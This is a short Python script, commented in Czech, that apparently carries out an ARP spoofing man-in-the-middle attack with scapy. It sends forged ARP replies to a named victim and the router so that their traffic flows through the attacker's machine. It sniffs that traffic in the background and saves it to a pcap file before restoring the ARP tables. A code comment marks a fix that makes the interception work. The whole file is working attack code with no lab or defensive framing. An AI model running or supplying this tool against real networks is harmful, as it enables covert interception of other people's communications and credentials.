from scapy.all import ARP, wrpcap, sendp as s, Ether, get_if_hwaddr, conf, AsyncSniffer # Přidány importy pro HW MAC a Sniffing
import time

# --- Hlavní funkce --- #
def spoof(target_ip, target_mac, router_ip, router_mac):
    # Získání vlastní MAC adresy pro správné směrování trafficu k nám
    vlastni_mac = get_if_hwaddr(conf.iface)

    # Vytvoření falešného ARP paketu pro oběť
    # OPRAVA: Přidáno hwsrc=vlastni_mac, aby oběť posílala data útočníkovi
    arp_obet = Ether(dst=target_mac) / ARP(op=2, psrc=router_ip, hwsrc=vlastni_mac, pdst=target_ip, hwdst=target_mac)
    arp_router = Ether(dst=router_mac) / ARP(op=2, psrc=target_ip, hwsrc=vlastni_mac, pdst=router_ip, hwdst=router_mac)

    # Restore tabulek
    arp_obet_restore = Ether(dst=target_mac) / ARP(op=2, psrc=router_ip, hwsrc=router_mac, pdst=target_ip, hwdst=target_mac)
    arp_router_restore = Ether(dst=router_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=router_ip, hwdst=router_mac)

    # Funkce pro výpis zachycených paketů do konzole
    def packet_callback(pkt):
        if pkt.haslayer(Ether):
            print(f"[DATA] {pkt.summary()}")

    # Spuštění snifferu na pozadí (chytá reálná data, ne jen ARP)
    sniffer = AsyncSniffer(iface=conf.iface, filter=f"host {target_ip}", prn=packet_callback)
    sniffer.start()

    try: 
        print(f"Sending spoofed ARP packets to {target_ip} and {router_ip}... (Press Ctrl+C to stop)")
        while True:
            s(arp_obet, verbose=False)
            s(arp_router, verbose=False)
            
            time.sleep(2)

    except KeyboardInterrupt:   
        print("\nStopping ARP spoofing and restoring network...")
        
        # Zastavení odposlechu
        captured_packets = sniffer.stop()

        # Odeslání správných ARP paketů pro obnovení sítě
        s(arp_obet_restore, verbose=False, count=5)
        s(arp_router_restore, verbose=False, count=5)

        print(f"Network restored. Captured {len(captured_packets)} packets.")
        
        # Uložení reálné komunikace do .pcap souboru
        if captured_packets:
            wrpcap("capture.pcap", captured_packets)
            print("Communication saved to capture.pcap")
        
        print("Program terminated.")